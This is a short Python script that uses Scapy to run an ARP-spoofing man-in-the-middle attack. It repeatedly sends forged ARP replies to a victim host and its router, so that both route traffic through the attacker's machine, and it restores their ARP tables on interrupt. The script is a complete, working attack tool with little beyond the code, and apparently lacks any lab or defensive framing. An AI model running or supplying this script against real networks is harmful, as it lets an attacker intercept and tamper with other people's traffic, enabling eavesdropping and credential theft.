import scapy.all as scp
import sys
from getmac import get_mac_address as gma

"""
Sender hardware address (SHA) in Scapy 'HWSRC'
    Media address of the sender. In an ARP request this field is used to indicate the address of the host sending the request. In an ARP reply this field is used to indicate the address of the host that the request was looking for.
Sender protocol address (SPA) in Scapy 'PSRC'
    Internetwork address of the sender.
Target hardware address (THA) in Scapy 'HWDST'
    Media address of the intended receiver. In an ARP request this field is ignored. In an ARP reply this field is used to indicate the address of the host that originated the ARP request.
Target protocol address (TPA) in Scapy 'PDST'
    Internetwork address of the intended receiver.
"""


def arp_spoof(dest_ip, dest_mac, source_ip):
    packet = scp.ARP(op="is-at", hwsrc=gma(), psrc=source_ip,
                     hwdst=dest_mac, pdst=dest_ip)
    scp.send(packet, verbose=False)


def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
    packet = scp.ARP(op="is-at", hwsrc=source_mac,
                     psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    scp.send(packet, verbose=False)


def main():
    victim_ip = sys.argv[1]
    victim_mac = scp.getmacbyip(victim_ip)

    router_ip = sys.argv[2]
    router_mac = scp.getmacbyip(router_ip)

    print(f'Victim Mac = {victim_mac}')
    print(f'Router Mac = {router_mac}')
    print(f'Your Mac = {gma()}')

    try:
        print("Sending spoofed ARP packets")

        while True:
            arp_spoof(victim_ip, victim_mac, router_ip)
            arp_spoof(router_ip, router_mac, victim_ip)

    except KeyboardInterrupt:
        print("Restoring ARP Tables")
        arp_restore(router_ip, router_mac, victim_ip, victim_mac)
        arp_restore(victim_ip, victim_mac, router_ip, router_mac)
        quit()

main()
